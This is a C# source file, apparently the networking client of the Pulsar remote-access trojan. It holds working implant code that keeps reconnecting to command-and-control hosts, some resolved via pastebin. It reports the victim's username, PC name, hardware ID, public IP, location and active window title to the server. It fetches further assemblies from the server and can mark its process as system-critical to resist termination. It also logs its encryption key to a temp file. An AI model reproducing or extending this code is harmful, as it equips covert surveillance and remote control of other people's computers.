using NAudio.CoreAudioApi;
using Pulsar.Client.Helper;
using Pulsar.Client.IO;
using Pulsar.Client.IpGeoLocation;
using Pulsar.Client.User;
using Pulsar.Common.DNS;
using Pulsar.Common.Helpers;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Messages;
using Pulsar.Common.Utilities;
using Pulsar.Client.Config;
using System;
using System.Diagnostics;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using Pulsar.Common.UAC;
using Pulsar.Client.Utilities;
using Pulsar.Common.Networking;

namespace Pulsar.Client.Networking
{
    public class PulsarClient : Client, IDisposable
    {
        /// <summary>
        /// Used to keep track if the client has been identified by the server.
        /// </summary>
        private bool _identified;

        /// <summary>
        /// Indicates whether this client already requested deferred assemblies for the current session.
        /// </summary>
        private bool _requestedDeferredAssemblies;

        /// <summary>
        /// The hosts manager which contains the available hosts to connect to.
        /// </summary>
        private readonly HostsManager _hosts;

        /// <summary>
        /// Random number generator to slightly randomize the reconnection delay.
        /// </summary>
        private readonly SafeRandom _random;

        /// <summary>
        /// Create a <see cref="_token"/> and signals cancellation.
        /// </summary>
        private readonly CancellationTokenSource _tokenSource;

        /// <summary>
        /// The token to check for cancellation.
        /// </summary>
        private readonly CancellationToken _token;

    /// <summary>
    /// Indicates that shutdown was requested for the connect loop.
    /// </summary>
    private volatile bool _shutdownRequested;

    /// <summary>
    /// Tracks whether the instance was disposed to avoid double cleanup.
    /// </summary>
    private bool _disposed;

        /// <summary>
        /// Initializes a new instance of the <see cref="PulsarClient"/> class.
        /// </summary>
        /// <param name="hostsManager">The hosts manager which contains the available hosts to connect to.</param>
        /// <param name="serverCertificate">The server certificate.</param>
        public PulsarClient(HostsManager hostsManager, X509Certificate2 serverCertificate)
            : base(serverCertificate)
        {
            _hosts = hostsManager;
            _random = new SafeRandom();
            base.ClientState += OnClientState;
            base.ClientRead += OnClientRead;
            base.ClientFail += OnClientFail;
            _tokenSource = new CancellationTokenSource();
            _token = _tokenSource.Token;
        }

        /// <summary>
        /// Connection loop used to reconnect and keep the connection open.
        /// </summary>
        public void ConnectLoop()
        {
            string logFile = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "pulsar_client_connect.log");
            
            try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] ConnectLoop STARTED\r\n"); } catch { }
            
            while (!_shutdownRequested && !_token.IsCancellationRequested)
            {
                if (!Connected)
                {
                    var host = _hosts.GetNextHost();
                    
                    try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] GetNextHost returned: {(host == null ? "NULL" : $"{host.Hostname}:{host.Port}, IpAddress={host.IpAddress}")}\r\n"); } catch { }

                    if (host?.IpAddress == null)
                    {
                        Debug.WriteLine("Failed to get a valid host to connect to. Will retry after delay.");
                        try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] No valid host, sleeping...\r\n"); } catch { }
                        
                        // Check pastebin status to determine appropriate wait time
                        var (IsReachable, SuggestedWaitTimeMs) = _hosts.GetPastebinStatus();
                        int waitTime;
                        
                        if (!IsReachable && SuggestedWaitTimeMs > 0)
                        {
                            // Use suggested wait time for pastebin failures (5+ minutes to avoid rate limiting)
                            waitTime = SuggestedWaitTimeMs;
                            Debug.WriteLine($"Pastebin unreachable, waiting {waitTime / 1000} seconds before retry");
                        }
                        else
                        {
                            // Use normal reconnect delay when pastebin is reachable but no hosts available
                            waitTime = Settings.RECONNECTDELAY;
                        }
                        
                        Thread.Sleep(waitTime + _random.Next(250, 750));
                        continue;
                    }

                    try
                    {
                        try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] Attempting connect to {host.IpAddress}:{host.Port}\r\n"); } catch { }
                        try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] Before base.Connect() - Connected={Connected}\r\n"); } catch { }
                        base.Connect(host.IpAddress, host.Port);
                        try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] After base.Connect() - Connected={Connected}\r\n"); } catch { }
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Connection attempt failed: {ex.GetType().Name}: {ex.Message}");
                        try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] EXCEPTION {ex.GetType().Name}: {ex.Message}\r\n"); } catch { }
                        if (ex.InnerException != null)
                        {
                            try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}]   Inner: {ex.InnerException.Message}\r\n"); } catch { }
                        }
                    }
                }

                while (Connected)
                {
                    if (WaitForShutdownSignal(1000))
                    {
                        Disconnect();
                        return;
                    }
                }

                if (_shutdownRequested || _token.IsCancellationRequested)
                {
                    Disconnect();
                    return;
                }

                if (WaitForShutdownSignal(Settings.RECONNECTDELAY + _random.Next(250, 750)))
                {
                    Disconnect();
                    return;
                }
            }
        }

        private void OnClientRead(Client client, IMessage message, int messageLength)
        {
            string logFile = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "pulsar_client_connect.log");
            try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] OnClientRead: {message.GetType().Name}, Identified={_identified}\r\n"); } catch { }
            
            if (!_identified)
            {
                if (message is ClientIdentificationResult reply)
                {
                    _identified = reply.Result;
                    try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] ClientIdentificationResult received: Result={reply.Result}, now Identified={_identified}\r\n"); } catch { }
                    if (_identified)
                    {
                        try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] Identification successful, sending SetUserActiveWindowStatus\r\n"); } catch { }
                        // Now that identification is complete, send the active window status
                        string currentWindowTitle = GetCurrentWindowTitle();
                        Send(new SetUserActiveWindowStatus { WindowTitle = currentWindowTitle });
                        
                        try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] Identification successful, requesting deferred assemblies\r\n"); } catch { }
                        RequestDeferredAssemblies();
                    }
                }
                return;
            }

            MessageHandler.Process(client, message);
        }

        private void OnClientFail(Client client, Exception ex)
        {
            Debug.WriteLine($"Client Fail - Exception Message: {ex.Message}");
            client.Disconnect();
        }

        private void OnClientState(Client client, bool connected)
        {
            string logFile = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "pulsar_client_connect.log");
            try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] OnClientState: connected={connected}\r\n"); } catch { }
            
            _identified = false; // always reset identification
            _requestedDeferredAssemblies = false;

            if (connected)
            {
                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] Building ClientIdentification packet...\r\n"); } catch { }
                
                // Notify hosts manager of successful connection for pastebin timing logic
                _hosts.NotifySuccessfulConnection();
                
                // send client identification once connected

                var geoInfo = GeoInformationFactory.GetGeoInformation();
                var userAccount = new UserAccount();

                var identification = new ClientIdentification
                {
                    Version = Settings.ReportedVersion,
                    OperatingSystem = PlatformHelper.FullName,
                    AccountType = userAccount.Type.ToString(),
                    Country = geoInfo.Country,
                    CountryCode = geoInfo.CountryCode,
                    ImageIndex = geoInfo.ImageIndex,
                    Id = HardwareDevices.HardwareId,
                    Username = userAccount.UserName,
                    PcName = SystemHelper.GetPcName(),
                    Tag = Settings.TAG,
                    EncryptionKey = Settings.ENCRYPTIONKEY,
                    Signature = Convert.FromBase64String(Settings.SERVERSIGNATURE),
                    PublicIP = geoInfo.IpAddress ?? "Unknown"
                };

                try
                {
                    try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] ClientID: {identification.Id} (len={identification.Id?.Length})\r\n"); } catch { }
                    try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] EncryptionKey: '{identification.EncryptionKey}'\r\n"); } catch { }
                    try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] Signature: {identification.Signature?.Length ?? 0} bytes\r\n"); } catch { }
                    try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] Sending ClientIdentification (Version={identification.Version}, Tag={identification.Tag})...\r\n"); } catch { }
                    client.Send(identification);
                    try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] ClientIdentification sent successfully\r\n"); } catch { }
                }
                catch (Exception ex)
                {
                    try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] FAILED to send identification: {ex.Message}\r\n"); } catch { }
                }
            }
            else
            {
                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] Client disconnected\r\n"); } catch { }
            }
        }

        private void RequestDeferredAssemblies()
        {
            if (_requestedDeferredAssemblies)
            {
                return;
            }

            var missingAssemblies = DeferredAssemblyManager.GetMissingAssemblies();
            if (missingAssemblies == null || missingAssemblies.Length == 0)
            {
                return;
            }

            try
            {
                Send(new RequestDeferredAssemblies
                {
                    Assemblies = missingAssemblies,
                    ClientVersion = Settings.ReportedVersion
                });

                _requestedDeferredAssemblies = true;
                Debug.WriteLine($"Requested {missingAssemblies.Length} deferred assemblies from server.");
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed to request deferred assemblies: {ex.Message}");
            }
        }

        /// <summary>
        /// Gets the title of the currently active window.
        /// </summary>
        /// <returns>The title of the active window.</returns>
        private string GetCurrentWindowTitle()
        {
            try
            {
                var foregroundWindow = NativeMethods.GetForegroundWindow();
                int length = NativeMethods.GetWindowTextLength(foregroundWindow);
                if (length == 0)
                    return string.Empty;
                var sb = new System.Text.StringBuilder(length + 1);
                NativeMethods.GetWindowText(foregroundWindow, sb, sb.Capacity);
                return sb.ToString();
            }
            catch
            {
                return string.Empty;
            }
        }

        /// <summary>
        /// Stops the connection loop and disconnects the connection.
        /// </summary>
        public void Exit()
        {
            if (Settings.MAKEPROCESSCRITICAL && UAC.IsAdministrator())
            {
                NativeMethods.RtlSetProcessIsCritical(0, 0, 0);
            }

            _shutdownRequested = true;
            _tokenSource.Cancel();
            Disconnect();
        }

        protected override void Dispose(bool disposing)
        {
            if (!disposing || _disposed)
            {
                return;
            }

            _shutdownRequested = true;
            _disposed = true;

            _tokenSource.Cancel();

            try
            {
                base.Dispose(disposing);
            }
            finally
            {
                _tokenSource.Dispose();
            }
        }

        /// <summary>
        /// Waits for either a shutdown request/cancellation or until the specified timeout elapses.
        /// </summary>
        /// <param name="timeoutMs">Timeout in milliseconds.</param>
        /// <returns><c>true</c> if shutdown was requested; otherwise <c>false</c>.</returns>
        private bool WaitForShutdownSignal(int timeoutMs)
        {
            const int slice = 100;
            var waited = 0;

            while (waited < timeoutMs && !_shutdownRequested && !_token.IsCancellationRequested)
            {
                var delay = Math.Min(slice, timeoutMs - waited);
                Thread.Sleep(delay);
                waited += delay;
            }

            return _shutdownRequested || _token.IsCancellationRequested;
        }
    }
}
